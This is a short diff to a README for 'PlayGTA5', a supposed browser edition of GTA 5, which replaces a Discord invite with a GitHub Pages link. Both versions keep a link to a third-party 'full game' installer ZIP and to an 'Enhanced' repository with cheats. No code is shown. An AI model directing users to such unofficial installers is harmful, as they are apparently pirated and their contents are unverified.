@@ -1,9 +1,8 @@
-# PlayGTA5 — download, play, and troubleshoot
-DISCORD SERVER!!
+# PlayGTA5 — WebAssembly & WebGPU Browser Edition
 
-https://discord.gg/ACgUGFwm4
+🚀 **Live GitHub Pages Website:** [**https://hammadshakeelai.github.io/gta5-web/**](https://hammadshakeelai.github.io/gta5-web/)
 
-[**Play in browser / device check**](https://gta5-87g.pages.dev/__support/) · [**Download installer ZIP**](https://github.com/alihammoud21/playgta5/releases/download/full-game-v1/PlayGTA5-Installer-v2.zip) · [Installation](#download-and-play-on-windows) · [Mac](#download-and-play-on-mac) · [Higher-FPS setup](#performance--higher-fps) · [Report a problem](https://github.com/alihammoud21/playgta5/issues/new/choose)
+[**Play in Browser / Device Check**](https://hammadshakeelai.github.io/gta5-web/support/) · [**Download Installer ZIP**](https://github.com/alihammoud21/playgta5/releases/download/full-game-v1/PlayGTA5-Installer-v2.zip) · [Installation](#download-and-play-on-windows) · [Mac](#download-and-play-on-mac) · [Higher-FPS Setup](#performance--higher-fps)
 
 **Want controllers, cheats, and the experimental development map?** Use the separate [**PlayGTA5 Enhanced** repository](https://github.com/alihammoud21/playgta5-enhanced). It reuses this installation and adds a launcher, standard-gamepad input bridge, cheat-code entry panel, and access to the existing `env_test` level. These are experimental additions.
 
